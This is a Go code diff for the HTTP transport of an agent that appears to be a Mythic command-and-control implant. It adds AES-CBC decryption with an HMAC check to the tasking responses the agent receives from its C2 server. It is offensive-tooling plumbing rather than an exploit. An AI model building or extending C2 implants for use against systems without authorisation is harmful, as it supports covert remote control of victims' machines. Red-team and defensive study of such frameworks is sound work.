@@ -168,18 +168,34 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
 	log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))
 
-	// Decrypt if encryption key is provided
+	// Decrypt the response if encryption key is provided
+	var decryptedData []byte
 	if h.EncryptionKey != "" {
-		// TODO: Implement decryption
-		log.Printf("[DEBUG] Skipping decryption (not implemented)")
+		log.Printf("[DEBUG] Decrypting response...")
+		// First, base64 decode the response
+		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
+		if err != nil {
+			log.Printf("[DEBUG] Failed to base64 decode response: %v", err)
+			return nil, fmt.Errorf("failed to decode response: %w", err)
+		}
+		
+		// Decrypt the decoded data
+		decryptedData, err = h.decryptResponse(decodedData)
+		if err != nil {
+			log.Printf("[DEBUG] Failed to decrypt response: %v", err)
+			return nil, fmt.Errorf("failed to decrypt response: %w", err)
+		}
+		log.Printf("[DEBUG] Decrypted response: %s", string(decryptedData))
+	} else {
+		log.Printf("[DEBUG] No encryption key, using raw response")
+		decryptedData = respBody
 	}
 
-	log.Printf("[DEBUG] Attempting to parse GetTasking response as JSON")
+	log.Printf("[DEBUG] Attempting to parse response as JSON")
 
-	// Parse the response - Mythic returns different formats
-	// For now, assume it returns a JSON array of tasks
+	// Parse the decrypted response - Mythic returns different formats
 	var taskResponse map[string]interface{}
-	if err := json.Unmarshal(respBody, &taskResponse); err != nil {
+	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
 		// If not JSON, might be no tasks
 		log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
 		return []structs.Task{}, nil
@@ -208,6 +224,74 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	}
 
 	return tasks, nil
+}
+
+// decryptResponse decrypts a response from Mythic using the same format as Freyja
+func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
+	if h.EncryptionKey == "" {
+		return encryptedData, nil // No encryption
+	}
+
+	// Decode the base64 key
+	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
+	if err != nil {
+		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
+	}
+
+	// The response format should be: UUID (36 bytes) + IV (16 bytes) + Ciphertext + HMAC (32 bytes)
+	if len(encryptedData) < 36+16+32 {
+		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
+	}
+
+	// Extract UUID (first 36 bytes)
+	uuidBytes := encryptedData[:36]
+	log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))
+
+	// Extract IV (next 16 bytes)
+	iv := encryptedData[36:52]
+
+	// Extract HMAC (last 32 bytes)
+	hmacBytes := encryptedData[len(encryptedData)-32:]
+
+	// Extract ciphertext (everything between IV and HMAC)
+	ciphertext := encryptedData[52 : len(encryptedData)-32]
+
+	// Verify HMAC
+	mac := hmac.New(sha256.New, key)
+	mac.Write(encryptedData[:len(encryptedData)-32]) // Everything except HMAC
+	expectedHmac := mac.Sum(nil)
+
+	if !hmac.Equal(hmacBytes, expectedHmac) {
+		return nil, fmt.Errorf("HMAC verification failed")
+	}
+
+	// Decrypt using AES-CBC
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
+	}
+
+	if len(ciphertext)%aes.BlockSize != 0 {
+		return nil, fmt.Errorf("ciphertext length not multiple of block size")
+	}
+
+	mode := cipher.NewCBCDecrypter(block, iv)
+	plaintext := make([]byte, len(ciphertext))
+	mode.CryptBlocks(plaintext, ciphertext)
+
+	// Remove PKCS#7 padding
+	padding := int(plaintext[len(plaintext)-1])
+	if padding > aes.BlockSize || padding == 0 {
+		return nil, fmt.Errorf("invalid padding")
+	}
+
+	for i := len(plaintext) - padding; i < len(plaintext); i++ {
+		if plaintext[i] != byte(padding) {
+			return nil, fmt.Errorf("invalid padding")
+		}
+	}
+
+	return plaintext[:len(plaintext)-padding], nil
 }
 
 // PostResponse sends a response back to Mythic
